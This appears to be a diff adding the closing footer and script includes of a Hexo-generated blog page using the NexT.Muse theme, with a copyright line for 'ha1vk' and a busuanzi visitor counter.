+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
